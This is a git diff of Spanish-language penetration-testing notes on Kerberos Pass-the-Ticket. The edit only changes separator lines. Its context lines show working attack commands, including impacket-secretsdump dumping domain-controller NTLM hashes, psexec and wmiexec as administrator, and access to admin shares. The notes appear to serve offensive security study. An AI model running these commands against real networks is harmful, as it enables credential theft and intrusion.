@@ -18,7 +18,7 @@ linked:
 ---
 # Pass-the-Ticket - Inyección y Uso
 
-***
+---
 
 ## Rubeus ptt (Windows)
 
@@ -41,7 +41,7 @@ klist
 dir \\dc01.corp.local\c$
 ```
 
-___
+---
 
 ## mimikatz kerberos::ptt (Windows)
 
@@ -61,7 +61,7 @@ klist  # Confirmar en cmd
 dir \\target\c$  # Usar
 ```
 
-___
+---
 
 ## impacket -k -no-pass (Linux)
 
@@ -85,7 +85,7 @@ impacket-wmiexec -k -no-pass corp.local/administrator@target.corp.local
 impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/administrator@dc01.corp.local
 ```
 
-___
+---
 
 ## OverPass-the-Hash (hash → TGT → PtT)
 
@@ -107,7 +107,7 @@ klist
 dir \\target\c$
 ```
 
-___
+---
 
 ## S4U (getST — delegation abuse)
 
@@ -128,7 +128,7 @@ export KRB5CCNAME=administrator@cifs_dc01.corp.local.ccache
 impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
 ```
 
-___
+---
 
 ## Requirements y troubleshooting
 
@@ -157,4 +157,4 @@ nc -zv dc01.corp.local 88
 impacket-psexec -k -no-pass corp.local/admin@target.corp.local -target-ip 10.10.10.5
 ```
 
-***
+---
